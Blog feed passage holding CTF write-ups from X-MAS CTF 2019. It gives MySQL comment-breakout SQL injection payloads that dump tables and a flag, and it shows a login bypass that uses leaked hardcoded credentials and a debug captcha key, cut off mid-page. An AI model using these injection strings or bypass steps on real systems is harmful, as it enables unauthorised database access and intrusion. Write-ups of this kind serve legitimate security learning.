        <content type="html"><![CDATA[<p>The author note for this CTF challenge.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(1) New Message: &quot;Hey dude. So we have this database system at work and I just found an SQL injection point. I quickly fixed it by commenting out all the user input in the query. </span><br><span class="line">Don&#x27;t worry, I made the query so that it responds with boss&#x27;s profile, since he is kind of the only person actively using this database system, and he always looks up his own name, lol. </span><br><span class="line">Anyway, guess we&#x27;ll go with this til&#x27; the sysadmin comes and fixes the issue.&quot;</span><br><span class="line"></span><br><span class="line">Huh, so hear no evil, see no evil, ... execute no evil?</span><br><span class="line"></span><br><span class="line">Remote server: http://challs.xmas.htsp.ro:11002</span><br><span class="line">Author: Milkdrop</span><br></pre></td></tr></table></figure><p>Browsing through the site shows a search page. Any simple input gives the same output as below:<br><img src="/solving-execute-no-evil-from-x-mas-ctf-2019/2.1.jpg" alt="alt"></p><p>Viewing through the html source shows an interesting comment at line 12.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Cobalt Inc. employee database search<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Search&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ?source=1 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>Geronimo<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>People say he owns a Cadillac ...<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Looks like a parameter and value. Lets try it out. So the URL becomes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?source=1</span><br></pre></td></tr></table></figure><p>And the response returned is the backend source code for the index page. Lets go through it in brief.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span> (<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span> ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form <span class="class"><span class="keyword">class</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Cobalt</span> <span class="title">Inc</span>. <span class="title">employee</span> <span class="title">database</span> <span class="title">search</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">label</span>&gt;<span class="title">Name</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">name</span>&quot; <span class="title">autocomplete</span>=&quot;<span class="title">off</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Search</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- ?<span class="title">source</span>=1 --&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> (&quot;<span class="title">config</span>.<span class="title">php</span>&quot;);</span></span><br><span class="line"><span class="class">$<span class="title">conn</span> = <span class="title">new</span> <span class="title">mysqli</span> ($<span class="title">servername</span>, $<span class="title">username</span>, $<span class="title">password</span>, $<span class="title">dbname</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span> (<span class="title">isset</span> ($<span class="title">_GET</span>[&#x27;<span class="title">name</span>&#x27;])) </span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span> (<span class="string">&quot;*&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$records</span> = <span class="title function_ invoke__">mysqli_query</span> (<span class="variable">$conn</span>, <span class="string">&quot;SELECT * FROM users WHERE name=/*&quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;*/ &#x27;Geronimo&#x27;&quot;</span>, MYSQLI_USE_RESULT); <span class="comment">// Don&#x27;t tell boss</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$records</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span> (<span class="string">&quot;&lt;p&gt;Our servers have run into a query error. Please try again later.&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;table&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &lt;tr&gt;</span></span><br><span class="line"><span class="string">    &lt;th&gt;Name&lt;/th&gt;</span></span><br><span class="line"><span class="string">    &lt;th&gt;Description&lt;/th&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span> (<span class="variable">$records</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;&#x27;</span>,<span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>],<span class="string">&#x27;&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;&#x27;</span>,<span class="variable">$row</span>[<span class="string">&quot;description&quot;</span>],<span class="string">&#x27;&lt;/td&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><ul><li>Line 1-6 : The php code checks if GET variable source is set, and if so it will call a custom function to disclose the source of index.php.</li><li>Line 8-19 : Is same HTML code we saw earlier.</li><li>Line 21-23 : Another php code, line 23 creates a mysql connection object with necessary details from config.php included at line 22.</li><li>Line 25-28 : The GET parameter name is checked and than str_replace is applied to it replacing all the * and stored in name variable. Next it is used in SELECT mysql statement but commented out so as to not affect the query and ‘Geronimo’ is hardcode at the end of the query to retrieve results at line 28.</li><li>Line 30-52 : Line 30 checks if results are retrieved and if so than display it using line 41 else display server query error. Rest of the html code is to display the data in tables form.</li></ul><p>So from the above code we see that the GET parameter name will consists our attack vector and we need to figure out how to break out of the comments on line 28 so that we can proceed with sql injection. My inital thought was to see if we could somehow bypass the str_replace which is quite common. You would find many resources about the same on the internet. But this challenge was not about bypassing str_replace.</p><p>After a lot of searching around and trying it out locally, eventually I figured out the string that broke the SQL statement was !&#x2F; . Resulting response was the error that I wanted in below image. A few references that helped me are here</p><p><a href="https://websec.files.wordpress.com/2010/11/sqli2.pdf">SQLi filter evasion and obfuscation PDF</a> : Page 7 last 2 lines.</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/comments.html">MySQL C-style comments</a></p><p><img src="/solving-execute-no-evil-from-x-mas-ctf-2019/2.2.jpg" alt="alt"></p><p>That is when I knew I had cracked the code :D. After breaking it again with !’ and completing the query with !’’ below query gave a way to retrieve data. Standard error based sqli payload.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?name=!&#x27;&#x27; union select 1,database(),3</span><br></pre></td></tr></table></figure><p>The next problem was to get other data such as tables names, columns and so on as payloads such as below resulted in breaking the query. Commenting out the last part didn’t work or I couldn’t get it to work.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?name=!&#x27;a&#x27; union select 1,table_name,3 from information_schema.tables</span><br></pre></td></tr></table></figure><p>The trick was to figure out what was breaking it. It turns out that the ‘Geronimo’ at the end of that statement broke the query. But we could use it in our query as it gets appended to our query as below.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?name=!&#x27;&#x27; union select 1,database(),&#x27;3&#x27;</span><br></pre></td></tr></table></figure><p><img src="/solving-execute-no-evil-from-x-mas-ctf-2019/2.3.jpg" alt="alt"></p><p>Now we need to make that part irrelevant to our query. This is where some of my mysql knowledge helped me out. I could use it to form a payload as below.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?name=!&#x27;&#x27; union select 1,table_name,3 from information_schema.tables where table_name!=</span><br></pre></td></tr></table></figure><p>which would create a mysql query like</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=/*!&#x27;&#x27; union select 1,table_name,3 from information_schema.tables where table_name!=*/ &#x27;Geronimo&#x27;</span><br></pre></td></tr></table></figure><p>and results into<br><img src="/solving-execute-no-evil-from-x-mas-ctf-2019/2.4.jpg" alt="alt"><br>From here it was easy to retrieve columns and eventually the flag. Query for flag is a below.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?name=!&#x27;&#x27; union select 1,whatsthis,3 from flag where whatsthis!=</span><br></pre></td></tr></table></figure><p>Response:<br><img src="/solving-execute-no-evil-from-x-mas-ctf-2019/2.5.jpg" alt="alt"></p><p>It was a good challenge and thanks X-MAS CTF team for it :).<br>Feel free to ping me on twitter for feedback or queries</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> sql injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving Roboworld from X-MAS CTF 2019</title>
      <link href="/solving-roboworld-from-x-mas-ctf-2019/"/>
      <url>/solving-roboworld-from-x-mas-ctf-2019/</url>
      
        <content type="html"><![CDATA[<p>The author note for this CTF challenge.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A friend of mine told me about this website where I can find secret cool stuff. He even managed to leak a part of the source code for me, but when I try to login it always fails :(  </span><br><span class="line">Can you figure out what&#x27;s wrong and access the secret files?  </span><br><span class="line">Remote server: http://challs.xmas.htsp.ro:11000  </span><br><span class="line">Files: leak.py  </span><br><span class="line">Author: Reda</span><br></pre></td></tr></table></figure><p>Lets look at the things we have. Browsing through the remote server URL gives you a login page as shown below. Looks like we may have to bypass the login.<br><img src="/solving-roboworld-from-x-mas-ctf-2019/1.1.jpg" alt="alt"></p><p>The login request generated from above page is as follows. Note the captcha value sent along with credentials at line 14.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challs.xmas.htsp.ro:11000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>57</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://challs.xmas.htsp.ro:11000</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://challs.xmas.htsp.ro:11000/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-bash">user=<span class="built_in">test</span>&amp;pass=<span class="built_in">test</span>&amp;captcha_verification_value=19OaI9eSj2</span></span><br></pre></td></tr></table></figure><p>The leak.py source provided shows what the backend looks like. Lets go through it in brief to better understand the situation.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, session, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> captcha <span class="keyword">import</span> verifyCaptchaValue</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;pass&#x27;</span>)</span><br><span class="line">    captchaToken = request.form.get(<span class="string">&#x27;captcha_verification_value&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    privKey = <span class="string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span> <span class="comment">#redacted</span></span><br><span class="line">    r = requests.get(<span class="string">&#x27;http://127.0.0.1:&#123;&#125;/captchaVerify?captchaUserValue=&#123;&#125;&amp;privateKey=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(port), captchaToken, privKey))</span><br><span class="line">    <span class="comment">#backdoored ;)))</span></span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&quot;backd00r&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;catsrcool&quot;</span> <span class="keyword">and</span> r.content == <span class="string">b&#x27;allow&#x27;</span>:</span><br><span class="line">        session[<span class="string">&#x27;logged&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;//redacted//&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login failed&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/captchaVerify&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">captchaVerify</span>():</span><br><span class="line">    <span class="comment">#only 127.0.0.1 has access</span></span><br><span class="line">    <span class="keyword">if</span> request.remote_addr != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Access denied&quot;</span></span><br><span class="line"></span><br><span class="line">    token = request.args.get(<span class="string">&#x27;captchaUserValue&#x27;</span>)</span><br><span class="line">    privKey = request.args.get(<span class="string">&#x27;privateKey&#x27;</span>)</span><br><span class="line">    <span class="comment">#<span class="doctag">TODO:</span> remove debugging privkey for testing: 8EE86735658A9CE426EAF4E26BB0450E from captcha verification system</span></span><br><span class="line">    <span class="keyword">if</span>(verifyCaptchaValue(token, privKey)):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(<span class="string">&quot;allow&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(<span class="string">&quot;deny&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>Line 1-4 : are the imports required for the flask program to work. After searching the internet, verifyCaptchaValue seems like a custom function.</li><li>Line 6 : creates and instance of Flask app.</li><li>Line 8-10 : defines a function to execute when root directory is accessed. In this case index.html will be served.</li><li>Line 12-25 : defines a function to execute when login API is accessed. It takes 3 parameters from the POST request(line 14-16). Line 18 has privKey redacted so we will need to make do without it. Line 19 creates a GET request to localhost with captchaToken and privKey which as the name suggests will verify the captcha. Line 21 shows hardcoded credentials which is never a good idea. So the logic checks if the user is backd00r,password is catsrcool and r.content is allow. If all three match than the session is granted and redirection happens to redacted page on line 23 else the login fails.</li><li>Line 28-40 : defines a function for captchaVerify API. Line 31 checks if the IP address from which the request came is 127.0.0.1. If not access is denied. Line 34-35 takes 2 parameters from the request which would be used further. Line 36 has an interesting comment about a privatekey used for testing the captcha verification system. Line 37 verifies the captch with privKey and token and returns allow or deny accordingly.</li></ul><p>Now that we have good idea of what is happening at the backend we can confirm that the login needs to be bypassed and we can plan to do so. We already have the hardcoded credentials. Only thing we need to do is somehow make the value of r.content as allow. That would happen when we provide the right privKey and token to the verifyCaptchaValue.</p><p>With that in mind I started with captchaVerify to see how it behaves as figuring that is the key to solving the challenge. It seems that we could query the API from outside even though the code suggests that only localhost can access it. We use the arguments that it expects and send a GET request with debugging privkey and captch from the login request.</p><p>Side note: Its always good to verify the code by testing it as the code you have may not be the same as that on the server due to various reasons.</p><p>Request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/captchaVerify?captchaUserValue=19OaI9eSj2&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challs.xmas.htsp.ro:11000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://challs.xmas.htsp.ro:11000</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://challs.xmas.htsp.ro:11000/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 19 Dec 2019 10:10:13 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">allow</span></span></span><br></pre></td></tr></table></figure><p>Now that we have checked that the test privKey is still working, we need to figure out what can be done about captcha value as that needs to match to pass the verification. Lets check to see how the captcha is generated. Looking through the view-source on login the page we see more developer comments :D.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">captchaGenerateVerificationValue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//Devnote:</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//Oops I broke the captcha verification function</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//so it will just generate random stuff for the verification value</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//hope no one notices :O</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> characters       = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> charactersLength = characters.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        result = <span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ ) &#123;</span></span><br><span class="line"><span class="language-javascript">            result += characters.<span class="title function_">charAt</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * charactersLength));</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;captcha&quot;</span>).<span class="property">value</span> = result</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Login:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span>&gt;</span></span><br><span class="line">    Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> /&gt;</span><span 